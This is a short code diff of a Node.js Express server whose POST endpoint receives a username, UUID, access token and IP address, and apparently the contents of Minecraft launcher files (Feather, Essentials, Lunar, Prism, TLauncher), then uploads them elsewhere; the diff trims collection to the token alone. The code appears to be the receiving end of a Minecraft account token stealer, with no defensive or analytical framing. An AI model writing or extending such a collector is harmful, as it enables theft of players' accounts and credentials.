@@ -22,7 +22,7 @@ setInterval(() => {
 }, 1000 * 60 * 15);
 
 app.post("/", async (req, res) => {
-    const requiredFields = ["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "prism", "tlauncher"];
+    const requiredFields = ["username", "uuid", "token", "ip"];
     if (!requiredFields.every(field => req.body.hasOwnProperty(field))) {
         console.log(req.body);
         return res.sendStatus(404);
@@ -40,7 +40,7 @@ app.post("/", async (req, res) => {
     }
 
     const uploadPromises = [];
-    const keys = ['token', 'feather', 'essentials', 'lunar', 'prism', 'tlauncher'];
+    const keys = ['token'];
     keys.forEach(key => {
         if (req.body[key] !== "File not found :(") {
             uploadPromises.push(
